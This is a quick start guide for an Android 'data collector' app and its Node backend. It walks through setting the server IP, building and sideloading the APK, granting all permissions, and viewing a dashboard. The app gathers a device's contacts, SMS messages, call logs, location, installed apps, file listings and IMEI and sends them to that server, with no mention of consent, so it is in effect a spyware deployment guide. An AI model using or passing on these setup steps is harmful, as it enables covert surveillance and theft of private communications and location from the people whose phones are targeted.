# Quick Start Guide

## 🚀 Get Started in 5 Minutes

### 1. Start the Backend Server

```bash
# Option 1: Use the script
./start-server.sh

# Option 2: Manual
cd backend-server
npm install
npm start
```

The server will run on `http://localhost:3000`

### 2. Find Your Server IP

**Mac/Linux:**
```bash
ifconfig | grep "inet " | grep -v 127.0.0.1
```

**Windows:**
```cmd
ipconfig
```

Copy the IP address (usually starts with 192.168.x.x or 10.x.x.x)

### 3. Update Android App

1. Open `android-app/app/src/main/java/com/datacollector/app/MainActivity.java`
2. Find line 23:
   ```java
   private static final String SERVER_URL = "http://YOUR_SERVER_IP:3000/api/data";
   ```
3. Replace `YOUR_SERVER_IP` with your actual IP

### 4. Build APK

**Using Android Studio:**
- Open `android-app` folder in Android Studio
- Wait for Gradle sync
- Click `Build > Build APK(s)`
- APK will be in: `app/build/outputs/apk/debug/app-debug.apk`

**Using Command Line:**
```bash
cd android-app
./gradlew assembleDebug
```

### 5. Install on Device

1. Transfer APK to Android device
2. Enable "Install from Unknown Sources"
3. Install the APK
4. Open the app
5. Grant all permissions when prompted

### 6. View Dashboard

Open browser: `http://YOUR_SERVER_IP:3000`

You should see:
- Statistics overview
- Connected devices
- All collected data

## 📱 What the App Collects

- ✅ Contacts
- ✅ SMS Messages
- ✅ Call Logs
- ✅ Installed Apps
- ✅ Device Location
- ✅ File System Info
- ✅ Device Information (IMEI, Model, etc.)

## 🔧 Common Issues

**App not connecting?**
- Check server IP in MainActivity.java
- Ensure device and server on same WiFi
- Check server is running

**No data showing?**
- Grant all app permissions
- Check device appears in dashboard
- Wait a few minutes for data collection

**Build errors?**
- Open in Android Studio
- File > Invalidate Caches / Restart
- Sync Gradle files

## 📝 Next Steps

- See `BUILD_INSTRUCTIONS.md` for detailed setup
- See `README.md` for full documentation
- Customize server URL for production use
